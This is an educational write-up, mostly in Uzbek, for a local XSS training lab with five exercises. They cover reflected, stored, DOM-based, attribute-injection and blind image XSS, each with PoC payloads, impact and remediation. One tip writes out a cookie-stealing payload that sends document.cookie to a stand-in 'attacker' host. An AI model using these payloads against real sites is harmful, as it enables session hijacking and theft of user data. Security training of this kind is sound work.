# XSS Lab — Writeup (5 exercises)

Bu hujjat `xss-lab` loyihasidagi har bir lab uchun qisqacha izoh, proof-of-concept (PoC) payloadlar, ta'siri va bartaraf etish choralarini beradi. Ushbu lab faqat ta'lim maqsadida va izolyatsiyalangan muhitda ishlashi kerak.

## Umumiy
- Ishga tushirish:

```bash
cd xss-lab
docker compose up --build
```

Ochish: http://localhost:5000

Har bir lab sahifasi quyidagi yo'llarda: `/lab1`, `/lab2`, `/lab3`, `/lab4`, `/lab5`.

## Lab 1 — Reflected XSS
- Tavsif: So'rov parametri (`q`) sahifaga qayta chiqariladi va HTML sifatida render qilinadi.
- PoC payloadlar:
  - Simple: `<script>alert(1)</script>`
  - URL encoded: `%3Cscript%3Ealert(1)%3C%2Fscript%3E`
- Misol URL:

```
http://localhost:5000/lab1?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```
- Natija: Brauzerda `alert(1)` oynasi ko'rinadi.
- Ta'siri: Reflected XSS foydalanuvchi sessiyalari o'g'irlash, CSRF, baiting va boshqa hujum vektorlariga olib kelishi mumkin.
- Bartaraf etish:
  - Har doim output encoding (`html-escape`) ishlating.
  - Use framework auto-escaping (Flask/Jinja2 default) — hech qachon `|safe` ishlatmang.
  - Content Security Policy (CSP) qo'llang.

## Lab 2 — Stored XSS
- Tavsif: Foydalanuvchi yuborgan `comment` serverda (xotirada) saqlanadi va boshqa foydalanuvchilarga HTML sifatida ko'rsatiladi.
- PoC:
  - `Comment` maydoniga `<script>alert('stored')</script>` yozib yuboring.
- Natija: Sahifani yuklaganda har bir foydalanuvchi uchun script bajariladi.
- Ta'siri: Kengroq ta'sir (ko'plab foydalanuvchilar), sessiya o'g'irlash, phishing.
- Bartaraf etish:
  - Ma'lumotlarni saqlashdan oldin yoki chiqarishda HTML-escaping.
  - Rich HTML kerak bo'lsa — sanitizatsiya kutubxonalari (DOMPurify kabi client-side yoki Bleach server-side).
  - Input validatsiyasi va maksimal uzunlik cheklash.

## Lab 3 — DOM-based XSS
- Tavsif: JavaScript `location.hash` ni `innerHTML` ga yozadi — bu faqat klient tomonda DOM sink hisoblanadi.
- PoC:

```
http://localhost:5000/lab3#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

- Natija: Sahifa yuklanganda `onerror` dan foydalanib `alert(1)` chaqiriladi.
- Ta'siri: DOM XSS orqali cookie/DOM ma'lumotlarini o'g'irlash yoki SPA xatti-harakatlarini manipulyatsiya qilish mumkin.
- Bartaraf etish:
  - `innerHTML` o'rniga `textContent` yoki DOM elementlari bilan toza insert qiling.
  - Hash fragmentni decode va escape qiling.

## Lab 4 — Attribute Injection
- Tavsif: Foydalanuvchi berilgan qiymat `title` va `data-user` atributlariga qo'yiladi va `|safe` bilan render qilinadi.
- PoC (attribute konteksi uchun misol):

```
http://localhost:5000/lab4?v=%22%20onmouseover%3D%22alert(1)%22
```

- Izoh: Agar atribut ichidagi qo'shtirnoqni yopib, yangi atribut qo'shsangiz (ya'ni quote breaking), brauzer atributni qabul qilsa, XSS mumkin.
- Ta'siri: UI elementlariga event injection, foydalanuvchi bilan o'zaro ta'sir paytida script ishga tushishi.
- Bartaraf etish:
  - Atribut qiymatlarini to'g'ri encode qiling (`attr` encoding).
  - Shablonlarda o'zgaruvchilarni atribut kontekstida xavfsiz chiqarish uchun kutubxona funksiyalaridan foydalaning.

## Lab 5 — Image / Blind-type
- Tavsif: Foydalanuvchi URL yuboradi va sahifada `<img src="...">` sifatida yuklanadi — bu blind interaction / ping-back uchun ishlatilishi mumkin.
- PoC / Foydalanish:
  - Foydalanuvchi boshqaruvchi serverga (`http://attacker.example/ping`) rasm URL yuboradi; serverga so'rov yuborilishi bilan brauzer mavjudligi va foydalanuvchi seansi aniqlanadi.
- Ta'siri: Ko'pincha blind XSS/SSRF/track qilish, noyob request orqali victim brauzerining mavjudligi aniqlanadi.
- Bartaraf etish:
  - Rasm URL larni oq ro'yxatlash va domen tekshiruvi.
  - Server orqali rasmni yuklab oling va qayta xizmat qiling (proxy), yoki `rel=noopener`, `referrerpolicy=no-referrer` kabi cheklovlar.

## Test va exploit bo'yicha maslahatlar
- Burp Suite / Repeater orqali parametrlarga payload yuboring va javobni kuzating.
- Browser devtools (Console / Network) orqali script yuklanishini tekshiring.
- `alert(1)` o'rniga `fetch('https://your-collab/…')` yoki `new Image().src='https://attacker/p?c='+document.cookie` kabi blind PoC larni ishlatib ko'ring (faqat o'zingiz nazorat qilayotgan serverda).

## Detection / Logging
- Web server access loglari va WAF qoidalari foydali (pattern: `<script>` yoki event handler atributlari).
- CSP violation report larni yoqish mumkin.

## Qonuniy va xavfsizlik izohi
- Ushbu laborotoriya faqat ta'lim va test muhitida ishlatiladi. Tashqi tizimlarda ruxsatsiz test qilish qonuniy muammolarga olib keladi.

## Manbalar
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- DOMPurify: https://github.com/cure53/DOMPurify
- Content Security Policy (CSP): https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
